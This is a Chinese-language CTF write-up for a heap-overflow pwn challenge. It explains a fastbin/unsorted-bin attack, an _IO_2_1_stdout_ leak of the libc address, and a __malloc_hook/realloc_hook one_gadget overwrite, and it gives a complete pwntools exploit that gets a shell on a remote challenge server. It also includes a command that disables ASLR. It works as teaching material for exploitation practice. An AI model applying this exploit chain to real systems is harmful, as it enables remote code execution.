# D0g3-baby

## 来源

d0g3-月赛


## 难度

5 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

只有3个功能, 添加,删除,退出.保护全开

## vul

```c++
 if ( v9 && v9 <= 0xFF )
    {
      v3 = v9;
      v4 = (_QWORD *)std::vector<char *,std::allocator<char *>>::operator[](&addrs, v7);
      *v4 = operator new[](v3);
      std::operator<<<std::char_traits<char>>(&std::cout, ":>");
      v5 = (void **)std::vector<char *,std::allocator<char *>>::operator[](&addrs, v7);
      read(0, *v5, 0x80uLL);                    // vul
    }
```

若大小小于0x80,就构成堆溢出情况.

## 知识点

fastbin attack

unsotedbin attack

IO_FILE

one_gadget

## 思路

通过堆溢出和unsoted bin split分割堆块到fastbin 中, partial write写入fastbin fd为IO_2_1_stdout符合fastbin size域的地址, ,然后通过fastbin attack打入该地址,修改IO_2_1_stdout的flag,还有IO_File_end指针,泄漏出libc,再次通过fastbin attack 打入 malloc_hook - 0x23处,通过 malloc_hook来实现Onegaget,realloc_hook调整execve第二个参数, 打通的几率为 1 /16



## 利用

### 准备

先关一下随机化,方便本地调试

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

exp准备

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn"
libFile  = "./libc.so.6"
#libFile  = "/lib/x86_64-linux-gnu/libc.so.6"

remoteIp = "39.97.119.22"
remotePort = 10003

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('^_^:\n', str(1))
	sla('?_?', str(size))
	sa(':>', data)

def rm(idx):
	sla('^_^:\n', str(2))
	sla('~_~', str(idx))

```



### 构造堆快布局

```python
	ad(0x68,  'A') #idx 实现堆溢出,修改chunk 1的size为small bin
	ad(0x68,  'B') #idx 这里被修改后释放会变成unsoted bin,再次开辟适当大小使main_arena信息到chunk2中
	ad(0x68,  'C') #idx 2 这里就可通过chunk中堆溢出实现partial write fastbin attack 打入stdout
	ad(0x68,  'D') #idx 3 防止topc chunk 的合并
```

### partial write打入IO_2_1_stdout

```python
	rm(0) #由于没有修改功能, 只能先释放,然后再开辟同样大小的内存,进行堆溢出修改chunk 1
	p = 'A' * 0x60
	p += p64(0x0)
	p += '\xe1'
	ad(0x68, p) # 修改chunk 1的大小
	rm(1) # 释放 chunk 1就变成了unsoted bin
	rm(2) # 释放 chunk 2
	ad(0x28, 'A' * 0x28) # 开辟该堆,会通过unsoted bin 分割,就是从chunk 1中分割出来

	p = 'B' * 0x30
	p += p64(0)
	p += p64(0x71)
	p += '\xdd\x25' # 使fd指向IO_2_1_stdout附近.
	ad(0x38, p) # 开辟该内存还是继续从unsoted bin中分割,也还是在chunk 1中, 然后通过堆溢出修改chunk 2
	ad(0x68, '\xdd\x25') # 这个只是为了调整fastbin, 里面数据没用,多写了.
```

### 泄漏 libc基址

修改IO_2_1_stdout的flags,再修改_IO_write_base为所想打印的地址, 而覆盖_IO_write_base最低byte为0就指向了还是IO内部,而IO内部储存大量的libc地址,修改完毕后,这个时候就输出了libc中的地址.

```python
    #修改IO_s2_1_stdout结构
    p = '\x00' * 0x33
    p += p64(0x00000000fbad1800) #flag
	p += p64(0) * 3
	p += p8(0) #_IO_write_base
	ad(0x68, p) #idx 5
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - lib.sym['_IO_2_1_stderr_'] - 192

	li('lib_base ' + hex(lib.address))
```

### fastbin attack打入 malloc_hook处

再使用chunk1 中的0x38小堆块释放又重新开辟,进行溢出修改

```python
	# fastbin attack to malloc_hook -0x23
	rm(4) #释放的是chunk 2
	rm(2) # 释放的是 chunk 1中0x38的小堆块

	p = 'B' * 0x30
	p += p64(0)
	p += p64(0x71)
	p += p64(lib.sym['__malloc_hook'] - 0x23)
	ad(0x38, p) #堆溢出,修改chunk 2中的fd为malloc_hook - 0x23处
	ad(0x68, 'A') # 调整
```

### 打one_gadget

由于直接修改malloc_hook为one_gadget,由于参数 [rsp + x] x 为0x30,0x50,0x70都不能使[rsp + x]为0,也就是说在执行execve的时候,第二个参数的内容没有满足为 0,所以不能触发get shell, 需要使用 realloc_hook来进行调整rsp的偏移,进而修改[rsp + x]满足为0,而在realloc_hook处,我们可以填写reallc的地址根据push来调整rsp的偏移,达到 [rsp + x]为0, 而在执行push完之后,就先进行判断 realloc_hook是否为0,若不为0,就先执行 realloc_hook处,这时我们就可以填写one_gadget 到realloc_hook处来打one_gadget

#### realloc_hook反汇编
```
pwndbg> disass 0x7fe7cb0ea6c0
Dump of assembler code for function __GI___libc_realloc:
   0x00007fe7cb0ea6c0 <+0>:	push   r15
   0x00007fe7cb0ea6c2 <+2>:	push   r14
   0x00007fe7cb0ea6c4 <+4>:	push   r13
   0x00007fe7cb0ea6c6 <+6>:	push   r12
   0x00007fe7cb0ea6c8 <+8>:	mov    r13,rsi
   0x00007fe7cb0ea6cb <+11>:	push   rbp
   0x00007fe7cb0ea6cc <+12>:	push   rbx
   0x00007fe7cb0ea6cd <+13>:	mov    rbx,rdi
   0x00007fe7cb0ea6d0 <+16>:	sub    rsp,0x38
   0x00007fe7cb0ea6d4 <+20>:	mov    rax,QWORD PTR [rip+0x33f8f5]        # 0x7fe7cb429fd0
   0x00007fe7cb0ea6db <+27>:	mov    rax,QWORD PTR [rax]
   0x00007fe7cb0ea6de <+30>:	test   rax,rax
   0x00007fe7cb0ea6e1 <+33>:	jne    0x7fe7cb0ea8e8 <__GI___libc_realloc+552>
   0x00007fe7cb0ea6e7 <+39>:	test   rsi,rsi
   0x00007fe7cb0ea6ea <+42>:	jne    0x7fe7cb0ea6f5 <__GI___libc_realloc+53>
   0x00007fe7cb0ea6ec <+44>:	test   rdi,rdi

```
通过调试,试出了有一个one_gadget满足execve 第二个参数内容为0的条件

1. realloc_hook =  libc_base + 0xf02a4
2. malloc_hook =  realloc_addr + 20

#### execve执行情况如下

```
0x7fe7cb15715d <exec_comm+2285>    call   execve <0x7fe7cb132770>
path: 0x7fe7cb1f2d57 ◂— 0x68732f6e69622f /* '/bin/sh' */
argv: 0x7ffe640ad200 ◂— 0x0
envp: 0x7ffe640ad2c8 —▸ 0x7ffe640adfaf ◂— 'LD_PRELOAD=/lib/x86_64-linux-gnu/libc.so.6'
```

#### payload构造如下

```python
	# modify malloc_hook as one_gadget
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[2]
	p = '\x11' * (0x13 - 8)
	p += p64(one_gadget)
	p += p64(lib.sym['realloc'] + 20) # realloc通过push个数调整rsp,从而调整execve第二个参数
	ad(0x68, p)
```

### get shell

```python
	# get shell
	sl('1')
	sl('10')
```

## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn"
libFile  = "./libc.so.6"
#libFile  = "/lib/x86_64-linux-gnu/libc.so.6"

remoteIp = "39.97.119.22"
remotePort = 10003

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('^_^:\n', str(1))
	sla('?_?', str(size))
	sa(':>', data)

def rm(idx):
	sla('^_^:\n', str(2))
	sla('~_~', str(idx))

#--------------------------Exploit--------------------------
def exploit():

	ad(0x68,  'A') #idx 0
	ad(0x68,  'B') #idx 1
	ad(0x68,  'C') #idx 2
	ad(0x68,  'D') #idx 3

	rm(0)
	p = 'A' * 0x60
	p += p64(0x0)
	p += '\xe1'
	ad(0x68, p) #idx 0
	rm(1)
	rm(2) # chunk for fastbin attack
	ad(0x28, 'A' * 0x28) #idx 1

	p = 'B' * 0x30
	p += p64(0)
	p += p64(0x71)
	p += '\xdd\x25'
	ad(0x38, p) #idx 2

	ad(0x68, 'A') #idx 4 for ajust fastbin 

	#p = 'A' * 0xA

	p = '\x00' * 0x33
	p += p64(0x00000000fbad1800) #flag
	p += p64(0) * 3
	p += p8(0)
	ad(0x68, p) #idx 5
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - lib.sym['_IO_2_1_stderr_'] - 192

	li('lib_base ' + hex(lib.address))

	# fastbin attack to malloc_hook -0x23
	rm(4)
	rm(2)

	p = 'B' * 0x30
	p += p64(0)
	p += p64(0x71)
	p += p64(lib.sym['__malloc_hook'] - 0x23)
	ad(0x38, p)
	ad(0x68, 'A')

	# modify malloc_hook as one_gadget
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[2]
	p = '\x11' * (0x13 - 8)
	p += p64(one_gadget)
	p += p64(lib.sym['realloc'] + 20)
	ad(0x68, p)

	# get shell
	sl('1')
	sl('10')


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	for i in range(100):
		try:
			if LOCAL:
				exe = ELF(exeFile)
				if LIB:
					lib = ELF(libFile)
					io = exe.process(env = {"LD_PRELOAD" : libFile})
				else:
					io = exe.process()
			
			else:
				exe = ELF(exeFile)
				io = remote(remoteIp, remotePort)
				if LIB:
					lib = ELF(libFile)
			exploit()
			finish()
		except:
			c()
		
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''

```

执行结果:

```bash
[DEBUG] Received 0x21 bytes:
    'bin\n'
    'dev\n'
    'flag\n'
    'lib\n'
    'lib32\n'
    'lib64\n'
    'pwn\n'
bin
dev
flag
lib
lib32
lib64
pwn
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x33 bytes:
    'flag{\\!_!/\\~_~/\\@_@/\\#_#/\\$_$/\\^_^/\\>_</\\*_*/&_&\\}\n'
flag{\!_!/\~_~/\@_@/\#_#/\$_$/\^_^/\>_</\*_*/&_&\}
$  
```
